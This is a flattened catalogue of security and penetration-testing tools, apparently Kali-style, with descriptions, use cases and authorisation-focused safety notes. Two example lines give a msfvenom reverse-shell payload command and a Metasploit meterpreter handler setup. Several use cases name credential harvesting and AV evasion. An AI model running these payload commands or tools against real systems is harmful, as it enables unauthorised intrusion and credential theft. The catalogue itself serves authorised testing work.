Vulnerability Analysis.full_description: Nuclei is a fast, customizable vulnerability scanner based on simple YAML-based templates. It uses templates to define checks for HTTP, TCP, DNS, and File protocols with built-in variable substitution and encoding support.
Vulnerability Analysis.use_case: Custom vulnerability scanning, CVE detection, bug bounty hunting
Vulnerability Analysis.safety_note: Some templates can be intrusive. Review templates before running.

Vulnerability Analysis.name: wpscan
Vulnerability Analysis.full_description: WPScan is a black box WordPress vulnerability scanner. It can enumerate WordPress plugins, themes, users, and known vulnerabilities. Essential for testing WordPress security.
Vulnerability Analysis.use_case: WordPress vulnerability scanning, plugin security testing, theme vulnerability detection
Vulnerability Analysis.safety_note: Aggressive enumeration may impact target website performance.

Vulnerability Analysis.name: lynis
Vulnerability Analysis.short_desc: Security auditing tool for Unix/Linux systems
Vulnerability Analysis.full_description: Lynis is a battle-tested security tool for systems running Linux, macOS, or Unix-like operating systems. It performs an in-depth security scan and provides a detailed report with suggestions for system hardening.
Vulnerability Analysis.use_case: Compliance auditing, system hardening, security baseline testing
Vulnerability Analysis.safety_note: Safe for authorized system auditing. Read-only operations.

Vulnerability Analysis.name: openvas
Vulnerability Analysis.full_description: OpenVAS (Open Vulnerability Assessment System) is a framework of several services and tools offering vulnerability scanning and management. Includes a database of over 50,000 vulnerability tests.
Vulnerability Analysis.use_case: Enterprise vulnerability scanning, compliance auditing, continuous vuln management
Vulnerability Analysis.safety_note: Comprehensive scanning can be resource-intensive and disruptive.

Vulnerability Analysis.name: sslyze
Vulnerability Analysis.full_description: SSLyze is a Python library and command-line tool which analyzes SSL/TLS configuration of servers. It can identify misconfigurations, weak ciphers, and certificate issues.
Vulnerability Analysis.use_case: SSL/TLS configuration auditing, certificate validation, vulnerability testing
Vulnerability Analysis.safety_note: Safe for testing authorized SSL/TLS endpoints.

Vulnerability Analysis.name: nessus
Vulnerability Analysis.full_description: Nessus is a comprehensive vulnerability scanning solution that can identify vulnerabilities, configuration issues, and malware on network devices, operating systems, applications, and databases.
Vulnerability Analysis.use_case: Enterprise vulnerability assessment, compliance checking, patch management
Vulnerability Analysis.safety_note: Requires license for full features. Scan authorized targets only.

Vulnerability Analysis.name: comodo-hallback
Vulnerability Analysis.full_description: Comodo Hammer is a free vulnerability scanner that helps identify security weaknesses in your network infrastructure before hackers can exploit them.
Vulnerability Analysis.use_case: Vulnerability identification, security assessments
Vulnerability Analysis.safety_note: Only scan authorized systems.

Web Application Analysis.name: burpsuite
Web Application Analysis.short_desc: Integrated platform for web app security testing
Web Application Analysis.full_description: Burp Suite is the leading software for web security testing. It provides comprehensive tools including proxy server, spider, repeater, intruder, sequencer, decoder, and collaborator. Professional version adds advanced active scanning.
Web Application Analysis.use_case: Web app penetration testing, API security testing, vulnerability research
Web Application Analysis.safety_note: Only use on authorized web applications. Active scanning can be intrusive.

Web Application Analysis.name: sqlmap
Web Application Analysis.short_desc: Automatic SQL injection and database takeover
Web Application Analysis.full_description: SQLMap automates detecting and exploiting SQL injection flaws and taking over database servers. It comes with a powerful detection engine and many niche features for penetration testing.
Web Application Analysis.use_case: SQL injection detection, database enumeration, data exfiltration, server compromise
Web Application Analysis.safety_note: CRITICAL: Only test authorized targets. Can cause data loss.

Web Application Analysis.name: zap
Web Application Analysis.short_desc: OWASP Zed Attack Proxy - free web app scanner
Web Application Analysis.full_description: OWASP ZAP is one of the world's most popular free security tools. It can help you automatically find security vulnerabilities in web applications while you're developing and testing.
Web Application Analysis.use_case: Web vulnerability scanning, manual security testing proxy, API testing
Web Application Analysis.safety_note: Active scanning should only be used on authorized targets.

Web Application Analysis.name: gobuster
Web Application Analysis.full_description: Gobuster is a tool for brute-forcing URIs (directories/files), DNS subdomains, and virtual host names. Written in Go, known for speed due to concurrent processing.
Web Application Analysis.use_case: Directory discovery, subdomain enumeration, virtual host discovery, file discovery
Web Application Analysis.safety_note: High thread counts may impact target server performance.

Web Application Analysis.name: dirsearch
Web Application Analysis.full_description: Dirsearch is a mature command-line tool designed to brute force directories and files in web servers. Supports multiple extensions, recursive scanning, and various features for web app testing.
Web Application Analysis.use_case: Hidden directory discovery, backup file finding, config file discovery, admin panel discovery
Web Application Analysis.safety_note: Adjust threads to avoid overwhelming target servers.

Web Application Analysis.name: ffuf
Web Application Analysis.short_desc: Fast web fuzzer written in Go
Web Application Analysis.full_description: FFUF (Fuzz Faster U Fool) is an open-source web fuzzer known for speed and flexibility. Designed for discovering hidden files, directories, subdomains, and parameter values.
Web Application Analysis.use_case: Fast directory fuzzing, subdomain discovery, parameter fuzzing, virtual host enumeration
Web Application Analysis.safety_note: Very fast by default - may need to throttle for some targets.

Web Application Analysis.name: xsstrike
Web Application Analysis.short_desc: Advanced XSS detection and exploitation suite
Web Application Analysis.full_description: XSStrike is a Cross-Site Scripting detection suite that doesn't use payload injection. Instead, it parses input and crafts context-aware payloads using a deterministic approach with multiple XSS detection modules.
Web Application Analysis.use_case: XSS vulnerability detection, XSS exploitation, blind XSS testing, WAF bypass research
Web Application Analysis.safety_note: Test payloads may execute in your browser during testing.

Web Application Analysis.name: wfuzz
Web Application Analysis.short_desc: Web application fuzzer for finding vulnerabilities
Web Application Analysis.full_description: WFuzz is a web application fuzzer based on replacing FUZZ keyword with payload values. It's designed to facilitate web app assessments using dictionaries.
Web Application Analysis.use_case: Directory and file discovery, parameter fuzzing, authentication bypass testing, API testing
Web Application Analysis.safety_note: Can generate significant traffic. Use rate limiting on production systems.

Web Application Analysis.name: dirb
Web Application Analysis.short_desc: Web content scanner for hidden directories
Web Application Analysis.full_description: DIRB is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary based attack against a web server and analyzing the response.
Web Application Analysis.use_case: Directory and file discovery, web content scanning
Web Application Analysis.safety_note: May trigger security systems on some targets.

Web Application Analysis.name: arachni
Web Application Analysis.short_desc: Feature-full Ruby web application security scanner
Web Application Analysis.full_description: Arachni is a high-performance Ruby framework designed for evaluating the security of web applications. It is modular, extensible, and has a friendly user interface for detecting various vulnerabilities.
Web Application Analysis.use_case: Comprehensive web vulnerability scanning, authenticated scanning, distributed scanning
Web Application Analysis.safety_note: Active scanning on production sites can cause issues.

Web Application Analysis.name: nikto-web
Web Application Analysis.short_desc: Web server and application vulnerability scanner
Web Application Analysis.full_description: Nikto web module for scanning web applications. Includes checks for web server misconfigurations, default files, and potential vulnerabilities.
Web Application Analysis.use_case: Web server scanning, CGI detection, version identification
Web Application Analysis.safety_note: Noisiness may trigger IDS. Scan authorized targets only.

Database Assessment.name: sqlmap
Database Assessment.short_desc: SQL injection and database takeover tool
Database Assessment.full_description: SQLMap is the premier tool for SQL injection testing and database exploitation. It supports all major databases and can extract data, execute commands, and even upload files to the underlying system.
Database Assessment.use_case: SQL injection testing, database enumeration, data extraction, privilege escalation
Database Assessment.safety_note: CRITICAL: Only test authorized databases. Can modify or delete data.

Database Assessment.name: sqlninja
Database Assessment.short_desc: SQL injection exploitation for SQL Server
Database Assessment.full_description: Sqlninja is an SQL injection exploitation tool written in Perl that focuses on gaining interactive OS shell on vulnerable web servers running Microsoft SQL Server.
Database Assessment.use_case: SQL Server exploitation, OS command execution via SQLi, privilege escalation
Database Assessment.safety_note: CRITICAL: Only use on authorized systems. Can lead to complete system compromise.

Database Assessment.name: sqlitebrowser
Database Assessment.full_description: DB Browser for SQLite (DB4S) is a high quality, visual, open source tool to create, design, and edit database files that are compatible with SQLite.
Database Assessment.use_case: SQLite database analysis, database forensics, data recovery
Database Assessment.safety_note: Read-only analysis is recommended for forensics.

Database Assessment.name: oscanner
Database Assessment.full_description: Oscanner is an Oracle database assessment tool that performs various security checks against Oracle databases including user enumeration, password testing, and privilege analysis.
Database Assessment.use_case: Oracle database auditing, default credential testing, privilege escalation

Database Assessment.name: sidguesser
Database Assessment.full_description: SIDGuesser guesses or enumerates Oracle database SIDs (System Identifiers) by attempting to connect to Oracle instances with different SID values.
Database Assessment.use_case: Oracle SID enumeration, Oracle database discovery

Password Attacks.name: john
Password Attacks.short_desc: Fast password cracker for hundreds of hash types
Password Attacks.full_description: John the Ripper is one of the most popular password cracking tools. It can detect many password hash types including MD5, SHA, bcrypt, and more. Supports wordlist, brute force, and hybrid modes.
Password Attacks.use_case: Password hash cracking, password strength auditing, recovery of lost passwords
Password Attacks.safety_note: CRITICAL: Only crack hashes you have legal authority to test.

Password Attacks.name: hashcat
Password Attacks.full_description: Hashcat is the world's fastest CPU-based password recovery tool utilizing GPU acceleration via OpenCL. Supports hundreds of hash algorithms and attack modes.
Password Attacks.use_case: GPU-accelerated cracking, WPA/WPA2 handshake cracking, credential auditing
Password Attacks.safety_note: Requires proper drivers and OpenCL runtime. Use responsibly on authorized systems.

Password Attacks.name: hydra
Password Attacks.short_desc: Parallelized login cracker for numerous protocols
Password Attacks.full_description: Hydra is a parallelized login cracker supporting numerous protocols. Very fast and flexible, with new modules easy to add. Performs dictionary and brute force attacks against authentication systems.
Password Attacks.use_case: SSH authentication testing, web form brute force, FTP/Email testing
Password Attacks.safety_note: CRITICAL: Only brute force services you have permission to test.

Password Attacks.name: medusa
Password Attacks.short_desc: Speedy parallel login hacker for network services
Password Attacks.full_description: Medusa is a speedy, massively parallel, modular login brute-forcer. Supports HTTP, IMAP, SSH, SMB, and many protocols. Designed for speed and high-concurrency testing.
Password Attacks.use_case: Network service authentication testing, parallel brute force, credential stuffing
Password Attacks.safety_note: Only test authorized services. Can trigger account lockouts.

Password Attacks.name: crunch
Password Attacks.short_desc: Wordlist generator with customizable character sets
Password Attacks.full_description: Crunch is a wordlist generator where you specify character set or min/max length to generate custom wordlists. Can generate all possible combinations and permutations.
Password Attacks.use_case: Custom wordlist generation, targeted password lists, character permutations
Password Attacks.safety_note: Large wordlists require significant disk space. Be aware of file sizes.

Password Attacks.name: cewl
Password Attacks.short_desc: Custom word list generator that spiders websites
Password Attacks.full_description: CeWL (Custom Word List generator) spiders a given URL to specified depth, following external links, and returns words for password crackers like John the Ripper.
Password Attacks.use_case: Targeted wordlist generation, OSINT-based password cracking, company-specific passwords
Password Attacks.safety_note: Spidering may trigger rate limiting or bans on some sites.

Password Attacks.name: hashid
Password Attacks.full_description: HashID is a tool written in Python that can identify various types of hashes used to encrypt data. It can identify over 220 unique hash types using regular expressions and hash comparison.
Password Attacks.use_case: Hash type identification, password audit preparation, tool selection for cracking
Password Attacks.safety_note: Tool identification only. No actual cracking performed.

Password Attacks.name: samdump2
Password Attacks.full_description: Samdump2 extracts password hashes from Windows SAM (Security Account Manager) registry hives. Works with both SYSKEY encrypted and non-encrypted SAM files.
Password Attacks.use_case: Windows hash extraction, password auditing
Password Attacks.safety_note: Only extract hashes from systems you have legal authority to access.

Wireless Attacks.name: aircrack-ng
Wireless Attacks.short_desc: Complete suite for WiFi security assessment
Wireless Attacks.full_description: Aircrack-ng is a complete suite for wireless network assessment. Includes tools for monitor mode, packet capture, packet injection, and WEP/WPA/WPA2 cracking. Industry standard for wireless security testing.
Wireless Attacks.use_case: WEP/WPA/WPA2 auditing, handshake capture and cracking, wireless reconnaissance
Wireless Attacks.safety_note: CRITICAL: Only test wireless networks you own or have written authorization for.

Wireless Attacks.name: airmon-ng
Wireless Attacks.full_description: Part of aircrack-ng suite. Used to put wireless cards into monitor mode or managed mode. Essential first step for wireless packet capture.
Wireless Attacks.use_case: Enable monitor mode for packet capture, kill interfering processes
Wireless Attacks.safety_note: Only use on wireless interfaces you own.

Wireless Attacks.name: airodump-ng
Wireless Attacks.short_desc: Wireless packet capture and network discovery
Wireless Attacks.full_description: Part of aircrack-ng suite. Used for packet capture of wireless networks. Can capture handshake data and show detailed information about nearby wireless networks.
Wireless Attacks.use_case: Capture WPA/WPA2 handshakes, discover nearby networks, channel monitoring
Wireless Attacks.safety_note: Only capture packets on networks you have permission to monitor.

Wireless Attacks.name: aireplay-ng
Wireless Attacks.short_desc: Packet injection tool for wireless attacks
Wireless Attacks.full_description: Part of aircrack-ng suite. Used for packet injection to generate traffic for various attacks including deauthentication, fake authentication, interactive packet replay, and ARP request injection.
Wireless Attacks.use_case: Deauthentication attacks, ARP injection, handshake capture acceleration
Wireless Attacks.safety_note: CRITICAL: Only inject packets on networks you have authorization for.

Wireless Attacks.name: wifite
Wireless Attacks.full_description: Wifite is an automated wireless attack tool designed to be hands-off. Automates collecting and cracking WPA/WPA2 handshakes and WEP encryption. Great for quick assessments.
Wireless Attacks.use_case: Automated wireless auditing, WPA handshake capture, quick wireless assessments
Wireless Attacks.safety_note: CRITICAL: Only test networks you own or have authorization for.

Wireless Attacks.name: reaver
Wireless Attacks.short_desc: Brute force attack against WPS PIN
Wireless Attacks.full_description: Reaver performs brute force attacks against WiFi Protected Setup (WPS) registrar PINs to recover WPA/WPA2 passphrases. Can recover passphrases in 4-10 hours on average.
Wireless Attacks.use_case: WPS vulnerability assessment, WPA passphrase recovery, router security testing
Wireless Attacks.safety_note: CRITICAL: Only test routers you own or have authorization for.

Wireless Attacks.name: wifiphisher
Wireless Attacks.short_desc: Automated phishing attacks against WiFi networks
Wireless Attacks.full_description: WiFiPhisher mounts automated phishing attacks against WiFi networks to obtain secret passphrases or credentials. A social engineering attack that doesn't rely on brute force.
Wireless Attacks.use_case: WiFi phishing campaigns, credential harvesting, security awareness training
Wireless Attacks.safety_note: CRITICAL: Phishing attacks require explicit authorization.

Wireless Attacks.name: kismet
Wireless Attacks.full_description: Kismet is an 802.11 wireless network detector, sniffer, and intrusion detection system. Works with any wireless card which supports raw monitoring mode.
Wireless Attacks.use_case: Wireless network discovery, wardriving, wireless IDS
Wireless Attacks.safety_note: Only sniff networks you have permission to monitor.

Wireless Attacks.name: pixiewps
Wireless Attacks.full_description: PixieWPS is an offline tool used to brute force the WPS PIN exploiting the low or non-existing entropy of some Access Points. This attack is known as the pixie dust attack.
Wireless Attacks.use_case: Pixie dust WPS attack, fast WPS PIN cracking, WPS vulnerability assessment
Wireless Attacks.safety_note: CRITICAL: Only use on authorized wireless networks.

Wireless Attacks.name: cowpatty
Wireless Attacks.full_description: Cowpatty is a WPA/WPA2-PSK authentication brute forcing tool. It can perform dictionary attacks against WPA/WPA2 handshakes captured using airodump-ng.
Wireless Attacks.use_case: WPA/WPA2 handshake cracking, PSK brute forcing
Wireless Attacks.safety_note: Only crack handshakes from networks you have authorization to test.

Exploitation Tools.name: msfconsole
Exploitation Tools.full_description: Msfconsole is the primary interface to Metasploit Framework. Provides an interactive command line for exploiting vulnerabilities, running auxiliary modules, and managing sessions.
Exploitation Tools.use_case: Exploitation, post-exploitation, vulnerability validation, payload generation
Exploitation Tools.safety_note: CRITICAL: Only exploit systems you have explicit permission to test.

Exploitation Tools.name: msfvenom
Exploitation Tools.short_desc: Payload generator and encoder for Metasploit
Exploitation Tools.full_description: Msfvenom generates and encodes payloads for use in exploits. Supports many output formats including executables, shellcode, and more. Replaced msfpayload and msfencode.
Exploitation Tools.example: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f elf > shell.elf
Exploitation Tools.use_case: Custom payload generation, shellcode creation, executable binding, AV evasion
Exploitation Tools.safety_note: CRITICAL: Only generate and use payloads on systems you have authorization for.

Exploitation Tools.name: searchsploit
Exploitation Tools.full_description: SearchSploit is the command-line search tool for Exploit-DB, the archive of public exploits and shellcode. Allows searching through thousands of exploits directly from terminal.
Exploitation Tools.use_case: Exploit research, vulnerability verification, finding exploits for targets
Exploitation Tools.safety_note: Test exploits in controlled environments first. Some may crash targets.

Exploitation Tools.name: exploitdb
Exploitation Tools.short_desc: Archive of public exploits and shellcode
Exploitation Tools.full_description: The Exploit Database is an archive of public exploits and corresponding shellcode from mailing lists and other sources. SearchSploit provides command-line access to the database.
Exploitation Tools.use_case: Exploit research, vulnerability verification, penetration testing
Exploitation Tools.safety_note: Review exploits carefully before use. Some may cause unintended effects.

Exploitation Tools.name: metasploit
Exploitation Tools.full_description: Metasploit Framework is the world's most used penetration testing framework. Provides information about vulnerabilities and helps develop/execute exploit code. Includes thousands of modules.
Exploitation Tools.example: msfconsole -q && use exploit/multi/handler && set PAYLOAD windows/meterpreter/reverse_tcp
Exploitation Tools.use_case: Exploitation development, post-exploitation, payload generation, vuln validation
Exploitation Tools.safety_note: CRITICAL: Only use on systems you have permission to exploit.

Exploitation Tools.name: empire
Exploitation Tools.full_description: Empire is a PowerShell and Python post-exploitation framework that implements the ability to run PowerShell agents without needing powershell.exe, rapidly deployable post-exploitation modules, and flexible communication.
Exploitation Tools.use_case: Advanced persistent threat simulation, post-exploitation, lateral movement
Exploitation Tools.safety_note: CRITICAL: Only use on authorized systems. Powerful offensive capability.

Exploitation Tools.name: covenant
Exploitation Tools.short_desc: .NET C2 framework for red team operations
Exploitation Tools.full_description: Covenant is a collaborative .NET C2 framework for red team operations. It aims to highlight the attack surface of .NET, make the use of offensive .NET tradecraft easier, and serve as a collaborative C2 platform.
Exploitation Tools.use_case: Red team operations, C2 frameworks, advanced persistent threat simulation
Exploitation Tools.safety_note: CRITICAL: Only use on authorized systems.

Sniffing & Spoofing.name: wireshark
Sniffing & Spoofing.short_desc: Network protocol analyzer for packet capture
Sniffing & Spoofing.full_description: Wireshark is the world's foremost network protocol analyzer. Lets you see what's happening on your network at a microscopic level. Standard for many enterprises, used for troubleshooting and protocol development.
Sniffing & Spoofing.use_case: Network traffic analysis, protocol debugging, security troubleshooting, malware analysis
Sniffing & Spoofing.safety_note: Only capture on networks you have permission to monitor.

Sniffing & Spoofing.name: tcpdump
Sniffing & Spoofing.full_description: Tcpdump prints out packet descriptions matching a boolean expression. Can save packet data to file for later analysis. Essential command-line tool for network diagnostics.
Sniffing & Spoofing.use_case: Command-line packet capture, network troubleshooting, traffic analysis
Sniffing & Spoofing.safety_note: Only capture on authorized networks. May require root privileges.

Sniffing & Spoofing.name: bettercap
Sniffing & Spoofing.short_desc: Swiss army knife for network MITM attacks
Sniffing & Spoofing.full_description: BetterCAP is a powerful, modular, portable MITM framework. Can perform HTTP/HTTPS traffic manipulation, DNS spoofing, ARP spoofing, and more through an interactive interface.
Sniffing & Spoofing.use_case: Man-in-the-middle attacks, network reconnaissance, traffic manipulation
Sniffing & Spoofing.safety_note: CRITICAL: MITM attacks require authorization. Can intercept all network traffic.

Sniffing & Spoofing.name: ettercap
Sniffing & Spoofing.full_description: Ettercap is a comprehensive suite for MITM attacks with sniffing of live connections, content filtering, and many protocol dissections. Supports both active and passive dissections.
Sniffing & Spoofing.use_case: ARP spoofing attacks, packet sniffing, DNS spoofing, SSL stripping
Sniffing & Spoofing.safety_note: CRITICAL: Only perform MITM attacks on networks you have permission to test.

Sniffing & Spoofing.name: responder
Sniffing & Spoofing.full_description: Responder is an LLMNR, NBT-NS, and MDNS poisoner. Answers to specific queries based on name suffix. Can harvest credentials by spoofing authentication responses.
Sniffing & Spoofing.use_case: Credential harvesting, SMB relay attacks, network credential interception
Sniffing & Spoofing.safety_note: CRITICAL: Only use on networks you have explicit authorization for.

Sniffing & Spoofing.name: dsniff
Sniffing & Spoofing.short_desc: Collection of tools for network auditing
Sniffing & Spoofing.full_description: Dsniff is a collection of tools for network auditing and penetration testing. Dsniff, filesnarf, mailsnarf, msgsnarf, urlsnarf, and webspy passively monitor a network for interesting data.
Sniffing & Spoofing.use_case: Password sniffing, URL logging, email capture, network forensics
Sniffing & Spoofing.safety_note: Only sniff on networks you have permission to monitor.

Sniffing & Spoofing.name: mitm6
Sniffing & Spoofing.full_description: mitm6 is a pentesting tool that exploits the default configuration of Windows to perform an IPv6 attack. By sending router advertisements and responding to DNS queries, it redirects traffic through the attacker.
Sniffing & Spoofing.use_case: IPv6 attack simulation, WPAD hijacking, NTLM relay attacks, DNSv6 spoofing
Sniffing & Spoofing.safety_note: CRITICAL: Only test on networks you have authorization for.

Sniffing & Spoofing.name: macchanger
Sniffing & Spoofing.full_description: Macchanger is a utility for manipulating and viewing the MAC address of network interfaces. Useful for anonymity and bypassing MAC-based authentication.
Sniffing & Spoofing.use_case: MAC spoofing, anonymity, bypassing MAC filters
Sniffing & Spoofing.safety_note: Use responsibly. MAC spoofing may violate network policies.

Forensics.name: autopsy
Forensics.short_desc: Digital forensics platform and browser interface
Forensics.full_description: Autopsy is a digital forensics platform and graphical interface to The Sleuth Kit. Used by law enforcement and corporate examiners to investigate what happened on a computer.
Forensics.use_case: Digital forensics investigation, disk image analysis, file recovery, timeline analysis
Forensics.safety_note: Work on copies of evidence. Maintain chain of custody.

Forensics.name: volatility
Forensics.full_description: Volatility is the world's most widely used memory forensics framework. Extracts digital artifacts from volatile memory (RAM) samples. Supports Windows, Linux, and Mac memory dumps.
Forensics.use_case: Memory forensics, malware analysis, incident response, digital forensics
Forensics.safety_note: Requires proper memory dumps and profiles. Analyze in isolated environment.

Forensics.name: binwalk
Forensics.full_description: Binwalk is a fast tool for analyzing, reverse engineering, and extracting firmware images. Has signatures for over 400 common file types and can extract embedded files automatically.
Forensics.use_case: Firmware analysis, embedded file extraction, reverse engineering, data carving
Forensics.safety_note: Extracted content should be analyzed safely in isolated environment.

Forensics.name: foremost
Forensics.short_desc: File carver for recovering deleted files
Forensics.full_description: Foremost is a console program that recovers files based on their headers, footers, and internal data structures. It can recover deleted files from disk images or raw devices.
Forensics.use_case: File recovery/carving, deleted file forensics, disk image analysis
Forensics.safety_note: Work on copies. Extraction may create large output.

Forensics.name: testdisk
Forensics.full_description: TestDisk is powerful free data recovery software. It helps recover lost partitions and/or make non-booting disks bootable again due to faulty software, viruses, or human error.
Forensics.use_case: Partition recovery, deleted file recovery, non-bootable disk recovery
Forensics.safety_note: Work on copies. TestDisk can write changes to disk.

Forensics.name: sleuthkit
Forensics.short_desc: Collection of file system forensics tools
Forensics.full_description: The Sleuth Kit (TSK) is a collection of Unix-based command line tools for disk image analysis. Includes tools for disk imaging, file system analysis, and more.
Forensics.use_case: File system forensics, disk image analysis, deleted file recovery
Forensics.safety_note: Always work on copies of evidence.

Forensics.name: photorec
Forensics.full_description: PhotoRec is a signature-based file recovery tool. It can recover lost files from various media including hard drives, digital cameras, and memory cards.
Forensics.use_case: File recovery, photo recovery, deleted data retrieval
Forensics.safety_note: Work on copies to avoid overwriting data.

Forensics.name: ddrescue
Forensics.short_desc: Data recovery tool for damaged drives
Forensics.full_description: GNU ddrescue is a data recovery tool. It helps to recover data from failing drives, CDROMs, and other storage devices. It copies data in reverse order to improve recovery.
Forensics.use_case: Drive recovery, failing disk imaging, data extraction from damaged media
Forensics.safety_note: Use carefully on failing drives to maximize data recovery.

Reverse Engineering.name: ghidra
Reverse Engineering.full_description: Ghidra is a software reverse engineering (SRE) suite developed by NSA. Supports many processor modules and file formats. Can run in both interactive and batch modes.
Reverse Engineering.use_case: Binary analysis, malware reverse engineering, exploit development, vuln research
Reverse Engineering.safety_note: Analyze potentially malicious code in isolated environment.

Reverse Engineering.name: radare2
Reverse Engineering.full_description: Radare2 is a portable command-line reverse engineering framework. Supports huge list of architectures and file formats. Ideal for forensics, disassembly, debugging, and patching.
Reverse Engineering.use_case: Binary analysis, debugging, malware analysis, exploitation
Reverse Engineering.safety_note: Use isolated environment for malware analysis.

Reverse Engineering.name: objdump
Reverse Engineering.full_description: objdump displays various information from object files. It can disassemble binary files, show section headers, symbol tables, and relocation information.
Reverse Engineering.use_case: Disassembly, binary analysis, symbol examination, section inspection
Reverse Engineering.safety_note: Safe for analysis of any binary.

Reverse Engineering.name: strings
Reverse Engineering.full_description: Strings displays printable strings in binary files. Useful for identifying contents of binary files, finding hardcoded passwords, version info, and other textual data.
Reverse Engineering.use_case: Binary analysis, malware forensics, password searching, version identification
Reverse Engineering.safety_note: Safe for analysis of any file.

Reverse Engineering.name: gdb
Reverse Engineering.full_description: GDB (GNU Debugger) is a portable debugger that runs on many Unix-like systems. It allows you to see what is happening inside a program while it executes.
Reverse Engineering.use_case: Program debugging, vulnerability analysis, crash analysis, reverse engineering

Reverse Engineering.name: readelf
Reverse Engineering.full_description: readelf displays information about one or more ELF (Executable and Linkable Format) files. Essential tool for analyzing Linux/Unix executables and libraries.
Reverse Engineering.use_case: ELF analysis, binary inspection, security research
Reverse Engineering.safety_note: Safe for analysis of any ELF file.

Reverse Engineering.name: ltrace
Reverse Engineering.full_description: ltrace is a debugging program which runs a specified command until it exits. It intercepts and records the dynamic library calls which are called by the executed process.
Reverse Engineering.use_case: Dynamic analysis, library call tracing, debugging

Reverse Engineering.name: strace
Reverse Engineering.full_description: strace intercepts and records the system calls which are called by a process and the signals which are received by a process. Essential for Linux debugging and analysis.
Reverse Engineering.use_case: System call analysis, debugging, malware analysis, system behavior understanding

Reporting Tools.name: dradis
Reporting Tools.full_description: Dradis is an open-source platform for sharing and managing information during security assessments and penetration tests. Provides a centralized repository for findings, evidence, and collaboration.
Reporting Tools.use_case: Pentest reporting, team collaboration, evidence management, finding tracking
Reporting Tools.safety_note: Ensure proper access controls for sensitive report data.

Reporting Tools.name: keepnote
Reporting Tools.full_description: KeepNote is a note taking application that works on Windows, Linux, and MacOS. It features hierarchical organization with rich text, file attachments, and more.
Reporting Tools.use_case: Note taking during assessments, evidence organization, documentation

Reporting Tools.name: cutycapt
Reporting Tools.full_description: CutyCapt is a small cross-platform command-line utility to capture WebKit's rendering of a web page into various vector and bitmap formats.
Reporting Tools.use_case: Web documentation, evidence capture, report screenshots, vuln documentation
Reporting Tools.safety_note: Capture only pages you have permission to capture.

Reporting Tools.name: magictree
Reporting Tools.full_description: MagicTree is a penetration testing data management tool that allows you to collect, correlate, and visualize data from various security scanning tools.
Reporting Tools.use_case: Data aggregation, reporting, result correlation, vulnerability management

Privilege Escalation.name: linpeas
Privilege Escalation.full_description: LinPEAS (Linux Privilege Escalation Awesome Script) searches for possible paths to escalate privileges on Linux/Unix hosts. Color-codes findings by severity.
Privilege Escalation.use_case: Linux privilege escalation enumeration, CTF privilege escalation, security auditing
Privilege Escalation.safety_note: Safe for enumeration on systems you have access to.

Privilege Escalation.name: winpeas
Privilege Escalation.full_description: WinPEAS checks for many known privilege escalation methods and misconfigurations on Windows hosts. Color-codes findings by severity.
Privilege Escalation.use_case: Windows privilege escalation enumeration, CTF privilege escalation, security auditing
Privilege Escalation.safety_note: Safe for enumeration on systems you have access to.

Privilege Escalation.name: mimikatz
Privilege Escalation.full_description: Mimikatz allows viewing and storing authentication credentials. It can extract plaintext passwords, LM/NTLM hashes, Kerberos tickets, and more from Windows memory.
Privilege Escalation.use_case: Credential extraction, pass-the-hash attacks, Kerberos ticket harvesting
Privilege Escalation.safety_note: CRITICAL: Only use on systems you have legal authority to access.

Privilege Escalation.name: sudo-exploit
Privilege Escalation.full_description: Various exploits for vulnerable sudo versions that allow privilege escalation from user to root. Check sudo version with sudo -V.
Privilege Escalation.safety_note: Only exploit systems you have authorization to test.

Privilege Escalation.name: dirtycow
Privilege Escalation.full_description: Dirty COW is a privilege escalation vulnerability in the Linux kernel (CVE-2016-5195) that allows an unprivileged local user to gain root access.
Privilege Escalation.safety_note: CRITICAL: Only use on systems you have authorization to exploit.

Privilege Escalation.name: polkit-exploit
Privilege Escalation.full_description: Exploits for vulnerable PolKit (policykit) versions that allow local privilege escalation to root through malformed pkexec commands.

Hardware Hacking.name: gputils
Hardware Hacking.short_desc: GNU PIC utility for microchip programming
Hardware Hacking.full_description: GPASM is a free assembler for PIC microcontrollers. Part of the gputils package for developing applications for Microchip PIC microcontrollers.

Hardware Hacking.name: minicom
Hardware Hacking.full_description: Minicom is a text-based modem control and terminal emulation program. Useful for connecting to serial consoles on routers, switches, and embedded devices.
Hardware Hacking.use_case: Serial console access, modem testing, hardware debugging

Hardware Hacking.name: android-sdk
Hardware Hacking.full_description: ADB (Android Debug Bridge) is a versatile command-line tool that lets you communicate with a device. It facilitates a variety of device actions like installing and debugging apps.
Hardware Hacking.use_case: Android device debugging, security testing, mobile forensics
Hardware Hacking.safety_note: Only connect to devices you have authorization to access.

Hardware Hacking.name: flashrom
Hardware Hacking.full_description: Flashrom is a utility for identifying, reading, writing, erasing, and verifying flash memory chips. Commonly used for firmware extraction and modification.
Hardware Hacking.use_case: Firmware extraction, hardware security testing, ROM dumping
Hardware Hacking.safety_note: CRITICAL: Incorrect use can permanently damage hardware.
